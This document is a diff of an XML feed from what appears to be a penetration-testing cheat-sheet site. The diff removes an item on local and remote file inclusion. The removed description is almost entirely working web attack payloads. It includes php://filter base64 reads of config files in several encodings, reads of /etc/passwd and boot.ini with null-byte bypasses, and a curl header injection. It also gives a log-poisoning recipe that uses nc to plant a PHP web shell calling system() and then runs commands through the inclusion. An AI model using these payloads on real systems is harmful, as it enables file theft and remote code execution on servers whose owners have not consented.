@@ -11,15 +11,6 @@
     
     
     <item>
-      <title>Local and Remote File Inclusions</title>
-      <link>/web-attacks/files-inclusions-and-injections/lfi_rfi/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/files-inclusions-and-injections/lfi_rfi/</guid>
-      <description>Local File Inclusion # Double Encoding page=php://filter/read=convert.base64-encode/resource=conf page%3Dphp%20%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dconf page%253Dphp%2520%253A%252F%252Ffilter%252Fread%253Dconvert.base64-encode%252Fresource%253Dconf # Files file:///boot.ini file:///boot.ini%00 file:///boot.ini%2500 file:///etc/passwd file:///etc/passwd%00 file:///etc/passwd%2500 # LFI in HTTP headers curl --header &amp;#34;Accept-Language: php://filter/read=convert.base64-encode/resource=config.php&amp;#34; http://target # LFI to RCE Can you read for a .log file such as: C:\xampp\apache\logs\access.log ? Then go nc -nv IP 80 Then write: &amp;lt;?php system($_GET[&amp;#39;acknak&amp;#39;]);?&amp;gt; Now access the log file using the LFI and inject system command in acknak parameter !# Checking if proc/self/environ is accessible # If blank page --&amp;gt; NOPE view.</description>
-    </item>
-    
-    <item>
       <title>File Upload</title>
       <link>/web-attacks/files-inclusions-and-injections/file_upload/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
